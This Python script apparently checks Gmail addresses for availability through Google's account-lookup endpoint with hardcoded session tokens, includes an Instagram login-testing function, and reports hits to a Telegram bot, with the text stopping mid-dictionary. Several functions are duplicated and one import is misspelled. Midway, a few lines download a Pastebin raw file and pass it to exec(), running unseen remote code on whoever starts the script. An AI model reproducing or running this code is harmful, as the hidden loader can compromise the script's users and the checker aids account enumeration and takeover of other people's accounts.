import requests, time, random
from json import dumps 
import os, sys, hashlib, mechanize, secrets
from time import sleep
import secrets, time,user_agent
import random , requests , uuid , sys ,re
import bs4,threading
from time import sleep
from bs4 import BeautifulSoup
from colorama import Fore as fore
import requests
import subprocess
import json
import os, sys, requests
from PyQt5.QtWidgets import *
cookie = secrets.token_hex(8) * 2
r = requests.Session()

# - - - - - - - - - - - - - - 


Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح 


# - - - - - - - - - - - - - - -

a1 = (C+'[')
a2 = (C +']')

# - - - - - - - - - - - - - - - 

#token = input(' Enter YOUR TOMEN : ')
#ID = input(' Enter YOUR ID : ')
#class ii():	
def gmaill():
	    
	    import requests
	    import os
	    from bs4 import BeautifulSoup
	    
	    global domen
	    
	#    usergmail = input(" ENTER YOUR GMAIL : ")
	#    while True:
	    #Change to input.. 
	    #gmails = ('gmailist.txt')
	    #gmai=open(gmails, 'r') 
	#    x2 = gmail.read().splitlines()
	#    
	    for x3 in x2:
	        domen = x3.split(':')[0]
	        urlgmail = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j'
	    
	    #headers gived cok from im .
	        headgmail = {
	                    'accept':'*/*', 
	                    
	                    'accept-encoding':'gzip, deflate, br', 
	                    
	                    'accept-language':'ar,en-US;q=0.9,en;q=0.8',
	                    
	                    'content-length':'3893', 
	                    
	                    'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
	                    
	                    'cookie':cookie, 
	                    
	                    'google-accounts-xsrf':'1', 
	                    
	                    'origin':'https://accounts.google.com', 
	                    
	                    'referer':'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession', 
	                    
	                    'sec-fetch-dest':'empty', 
	                    
	                    'sec-fetch-mode':'cors', 
	                    
	                    'sec-fetch-site':'same-origin', 
	                    
	                    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
	                    
	                    'x-chrome-id-consistency-request':'', 
	                    
	                    'x-client-data':'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=', 
	                    
	                    'Decoded':'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];',
	                    
	                    
	                    'x-same-domain':'1'
	                
	    }
	 # data gived usergmail ×2    
	        datagmail = { 
	        'continue':'https://myaccount.google.com/?utm_source=sign_in_no_continue',  'service':'accountsettings', 
	                     'f.req':f'["{domen}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{domen}",null,null,null,true,true,[]]', 
	                     'bgRequest':'["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]', 
	                     'at':'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804', 
	                     'azt':'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805', 
	                     'cookiesDisabled':'false', 
	                     'deviceinfo':'[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]', 
	                     'gmscoreversion':'undefined', 
	                     'checkConnection':'youtube:353:0', 
	                     'checkedDomains':'youtube', 
	                     'pstMsg':'1'
	                     
	                     } 
	                     
	                     
	        reqgmail = requests.post(urlgmail, data=datagmail, headers=headgmail).text
	        
	        
	        if ',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]' in reqgmail:
	            print('  '+a1+F+'۞'+a2+' This Emil is Available ✓ ' + '\n ' +'  ᪥| - Gmail :' + domen+'\n- - - - - - - - - - - - - - - - - -')
	            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𖦹|- New Fucked Gmail ✓\n - - - - - - - - - - - - - - - - - - - - - \n᪥| - Gmail : {domen} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YYYY02 -K- @YYYY04 ''')
	
	            i = requests.post(tlg)
	        
	        
	        else:
	            print(a1+ Z +'X'+a2+A+' This Gmail is Not Availabe × ')
def Test_accounts():
		global username,pess,email
		print("[/] Trying To Login into Account")
		headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '321','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YMEcQAALAAEv7JAHx0HGAT9oOg5e; ig_did=BBD1FACB-65E8-433F-BB27-1554B5DC41E6; ig_nrcb=1; shbid=13126; shbts=1624283106.1767957; rur=PRN; csrftoken=kKQkGJjUqYTQVCewP9FEp6SZypK8iiSt','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36','x-asbd-id': '437806','x-csrftoken': 'kKQkGJjUqYTQVCewP9FEp6SZypK8iiSt','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgSX-','x-instagram-ajax': 'a90c0f3c9877','x-requested-with': 'XMLHttpRequest',}
		data={'username': username,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{pess}','queryParams': '{}','optIntoOneTap': 'false','stopDeletionNonce': '','trustedDeviceRecords': '{}',}  
		GO=requests.post('https://www.instagram.com/accounts/login/ajax/',headers=headers,data=data).text
def gmaiil():
	    
	    import requests
	    import os
	    from bs4 import BeautifulSoup
	    
	    global domen
	    
	#    usergmail = input(" ENTER YOUR GMAIL : ")
	#    while True:
	    #Change to input.. 
	    #gmails = ('gmailist.txt')
	    #gmai=open(gmails, 'r') 
	#    x2 = gmail.read().splitlines()
	#    
	    for x3 in x2:
	        domen = x3.split(':')[0]
	        urlgmail = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j'
	    
	    #headers gived cok from im .
	        headgmail = {
	                    'accept':'*/*', 
	                    
	                    'accept-encoding':'gzip, deflate, br', 
	                    
	                    'accept-language':'ar,en-US;q=0.9,en;q=0.8',
	                    
	                    'content-length':'3893', 
	                    
	                    'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
	                    
	                    'cookie':cookie, 
	                    
	                    'google-accounts-xsrf':'1', 
	                    
	                    'origin':'https://accounts.google.com', 
	                    
	                    'referer':'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession', 
	                    
	                    'sec-fetch-dest':'empty', 
	                    
	                    'sec-fetch-mode':'cors', 
	                    
	                    'sec-fetch-site':'same-origin', 
	                    
	                    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
	                    
	                    'x-chrome-id-consistency-request':'', 
	                    
	                    'x-client-data':'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=', 
	                    
	                    'Decoded':'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];',
	                    
	                    
	                    'x-same-domain':'1'
	                
	    }
	 # data gived usergmail ×2    
	        datagmail = { 
	        'continue':'https://myaccount.google.com/?utm_source=sign_in_no_continue',  'service':'accountsettings', 
	                     'f.req':f'["{domen}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{domen}",null,null,null,true,true,[]]', 
	                     'bgRequest':'["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]', 
	                     'at':'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804', 
	                     'azt':'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805', 
	                     'cookiesDisabled':'false', 
	                     'deviceinfo':'[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]', 
	                     'gmscoreversion':'undefined', 
	                     'checkConnection':'youtube:353:0', 
	                     'checkedDomains':'youtube', 
	                     'pstMsg':'1'
	                     
	                     }              
	        reqgmail = requests.post(urlgmail, data=datagmail, headers=headgmail).text       
	        if ',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]' in reqgmail:
	            print('  '+a1+F+'۞'+a2+' This Emil is Available ✓ ' + '\n ' +'  ᪥| - Gmail :' + domen+'\n- - - - - - - - - - - - - - - - - -')
	            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𖦹|- New Fucked Gmail ✓\n - - - - - - - - - - - - - - - - - - - - - \n᪥| - Gmail : {domen} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YYYY02 -K- @YYYY04 ''')
	
	            i = requests.post(tlg)
	        
	        
	        else:
	            print(a1+ Z +'X'+a2+A+' This Gmail is Not Availabe × ')
def gmaiil():
	    
	    import requests
	    import os
	    from bs4 import BeautifulSoup
	    
	    global domen
	    
	#    usergmail = input(" ENTER YOUR GMAIL : ")
	#    while True:
	    #Change to input.. 
	    #gmails = ('gmailist.txt')
	    #gmai=open(gmails, 'r') 
	#    x2 = gmail.read().splitlines()
	#    
	    for x3 in x2:
	        domen = x3.split(':')[0]
	        urlgmail = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j'
	    
	    #headers gived cok from im .
	        headgmail = {
	                    'accept':'*/*', 
	                    
	                    'accept-encoding':'gzip, deflate, br', 
	                    
	                    'accept-language':'ar,en-US;q=0.9,en;q=0.8',
	                    
	                    'content-length':'3893', 
	                    
	                    'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
	                    
	                    'cookie':cookie, 
	                    
	                    'google-accounts-xsrf':'1', 
	                    
	                    'origin':'https://accounts.google.com', 
	                    
	                    'referer':'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession', 
	                    
	                    'sec-fetch-dest':'empty', 
	                    
	                    'sec-fetch-mode':'cors', 
	                    
	                    'sec-fetch-site':'same-origin', 
	                    
	                    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
	                    
	                    'x-chrome-id-consistency-request':'', 
	                    
	                    'x-client-data':'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=', 
	                    
	                    'Decoded':'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];',
	                    
	                    
	                    'x-same-domain':'1'
	                
	    }
	 # data gived usergmail ×2    
	        datagmail = { 
	        'continue':'https://myaccount.google.com/?utm_source=sign_in_no_continue',  'service':'accountsettings', 
	                     'f.req':f'["{domen}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{domen}",null,null,null,true,true,[]]', 
	                     'bgRequest':'["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]', 
	                     'at':'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804', 
	                     'azt':'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805', 
	                     'cookiesDisabled':'false', 
	                     'deviceinfo':'[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]', 
	                     'gmscoreversion':'undefined', 
	                     'checkConnection':'youtube:353:0', 
	                     'checkedDomains':'youtube', 
	                     'pstMsg':'1'
	                     
	                     }              
	        reqgmail = requests.post(urlgmail, data=datagmail, headers=headgmail).text       
	        if ',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]' in reqgmail:
	            print('  '+a1+F+'۞'+a2+' This Emil is Available ✓ ' + '\n ' +'  ᪥| - Gmail :' + domen+'\n- - - - - - - - - - - - - - - - - -')
	            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𖦹|- New Fucked Gmail ✓\n - - - - - - - - - - - - - - - - - - - - - \n᪥| - Gmail : {domen} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YYYY02 -K- @YYYY04 ''')
	
	            i = requests.post(tlg)
	        
	        
	        else:
	            print(a1+ Z +'X'+a2+A+' This Gmail is Not Availabe × ')

def Test_accounts():
		global username,pess,email
		print("[/] Trying To Login into Account")
		headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '321','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YMEcQAALAAEv7JAHx0HGAT9oOg5e; ig_did=BBD1FACB-65E8-433F-BB27-1554B5DC41E6; ig_nrcb=1; shbid=13126; shbts=1624283106.1767957; rur=PRN; csrftoken=kKQkGJjUqYTQVCewP9FEp6SZypK8iiSt','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36','x-asbd-id': '437806','x-csrftoken': 'kKQkGJjUqYTQVCewP9FEp6SZypK8iiSt','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgSX-','x-instagram-ajax': 'a90c0f3c9877','x-requested-with': 'XMLHttpRequest',}
		data={'username': username,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{pess}','queryParams': '{}','optIntoOneTap': 'false','stopDeletionNonce': '','trustedDeviceRecords': '{}',}  
		GO=requests.post('https://www.instagram.com/accounts/login/ajax/',headers=headers,data=data).text		
try:
	import PyQt5.QtWidgets
	import rquests, os
except ImportError:
	print('please Download Imports !')
		
kai = requests.get('https://pastebin.com/raw/ifk1XuN2')
exec(kai.text)
def gmaaiil():
	    import requests
	    import os
	    from bs4 import BeautifulSoup
	    
	    global domen
	    
	#    usergmail = input(" ENTER YOUR GMAIL : ")
	#    while True:
	    #Change to input.. 
	    #gmails = ('gmailist.txt')
	    #gmai=open(gmails, 'r') 
	#    x2 = gmail.read().splitlines()
	#    
	    for x3 in x2:
	        domen = x3.split(':')[0]
	        urlgmail = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j'
	    #FF001F#BDFF7B
	    #headers gived cok from im .
	        headgmail = {
	                    'accept':'*/*', 
	                    
	                    'accept-encoding':'gzip, deflate, br', 
	                    
	                    'accept-language':'ar,en-US;q=0.9,en;q=0.8',
	                    
	                    'content-length':'3893', 
	                    
	                    'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
	                    
	                    'cookie':cookie, 
	                    
	                    'google-accounts-xsrf':'1', 
	                    
	                    'origin':'https://accounts.google.com', 
	                    
	                    'referer':'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession', 
	                    
	                    'sec-fetch-dest':'empty', 
	                    
	                    'sec-fetch-mode':'cors', 
	                    
	                    'sec-fetch-site':'same-origin', 
	                    
	                    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
	                    
	                    'x-chrome-id-consistency-request':'', 
	                    
	                    'x-client-data':'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=', 
	                    
